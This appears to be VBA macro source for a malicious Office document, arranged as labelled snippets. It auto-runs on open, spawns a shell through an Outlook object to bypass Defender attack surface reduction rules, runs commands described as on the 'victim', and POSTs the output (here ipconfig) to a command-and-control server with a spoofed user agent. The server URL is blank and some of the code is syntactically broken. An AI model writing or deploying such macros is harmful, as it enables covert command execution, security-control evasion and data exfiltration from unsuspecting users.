Sub document_open()

------------------reads out "whoami" command-----------------------

	'create shell object

	Set WshShell = CreateObject("WScript.Shell")

	

	'execute the command from the new shell object

	Set WshShellExec = WshShell.Exec("whoami")

	

	'read the output of the command

	MsgBox(WshShellExec.StdOut.ReadAll)

------------------bypass defender ASR----------------------

	'first create outlook object

	Set objOL = CreateObject("Outlook.Application")

	

	'create shell object under outlook object

	Set WshShell = objOL.CreateObject("Wscript.Shell")

	

	'execute the command from shell object

	Set WshShellExec = WshShell.Exec("whoami")

	

	'remove comment to view the process tree

	'Set WshShellExec = WshShell.Exec("powershell -c sleep 5000")

	

	'read the output of the command

	MsgBox(WshShellExec.StdOut.ReadAll)

------------------command send to server----------------------

'function for running commands on victim

Function RunCommand(command As String) As String



	'handle errors

	On Error GoTo error

	

	'first create outlook object

	Set objOL = CreateObject("Outlook.Application")

	

	'create shell object under outlook object

	Set WshShell = objOL.CreateObject("Wscript.Shell")

	

	'execute the command from the new shell object

	Set WshShellExec = WshShell.Exec(command)

	

	'read the output of the command

	RunCommand = (WshShellExec.StdOut.ReadAll)

	

Done:

	Exit Function

	

	'error handle

	RunCommand = "ERROR"

	

End Function



'function for sending data to command server

Function SendToServer(data As String)



	'handle errors

	On Error GoTo error

	

	Set objHTTP = CreateObject ("MSXML2.ServerXMLHTTP")

	

	'set the c2 IP and PORT

	Url = http://

	

	'send the data as POST request

	objHTTP.Open "POST", Url, False

	

	'set user agent to look more like natural traffic

	objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"

	

	'send the data

	objHTTP.send (data)

	

Done:

	Exit Function

	

	'error handle

	MsgBox ("Cannot connect to server")

	

End Function



------------------call function when doc open----------------------

Sub document_open()



	Dim strData As String

	Dim strCommand As String

	

	strOutput = RunCommand("ipconfig")

	MsgBox (strOutput)

	SendToServer (strOutput)

	

End Sub
